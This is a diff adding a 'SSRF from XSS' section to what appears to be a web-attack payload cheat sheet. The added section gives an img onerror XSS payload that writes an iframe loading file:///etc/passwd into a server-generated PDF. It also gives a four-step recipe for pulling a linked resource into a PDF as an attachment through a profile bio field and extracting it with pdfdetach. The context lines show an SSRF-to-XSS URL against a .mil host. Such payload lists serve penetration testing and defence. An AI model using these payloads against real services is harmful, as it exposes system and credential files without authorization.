@@ -33,6 +33,7 @@
 * [SSRF exploiting WSGI](#ssrf-exploiting-wsgi)
 * [SSRF exploiting Redis](#ssrf-exploiting-redis)
 * [SSRF to XSS](#ssrf-to-xss)
+* [SSRF from XSS](#ssrf-from-xss)
 * [SSRF URL for Cloud Instances](#ssrf-url-for-cloud-instances)
   * [SSRF URL for AWS Bucket](#ssrf-url-for-aws-bucket)
   * [SSRF URL for AWS ECS](#ssrf-url-for-aws-ecs)
@@ -425,6 +426,25 @@ https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri= -> simple 
 
 https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://brutelogic.com.br/poc.svg
 ```
+
+## SSRF from XSS
+
+### Using an iframe
+
+The content of the file will be integrated inside the PDF as an image or text.
+
+```html
+<img src="echopwn" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
+```
+
+### Using an attachment
+
+Example of a PDF attachment using HTML 
+
+1. use `<link rel=attachment href="URL">` as Bio text
+2. use 'Download Data' feature to get PDF
+3. use `pdfdetach -saveall filename.pdf` to extract embedded resource
+4. `cat attachment.bin`
 
 ## SSRF URL for Cloud Instances
 
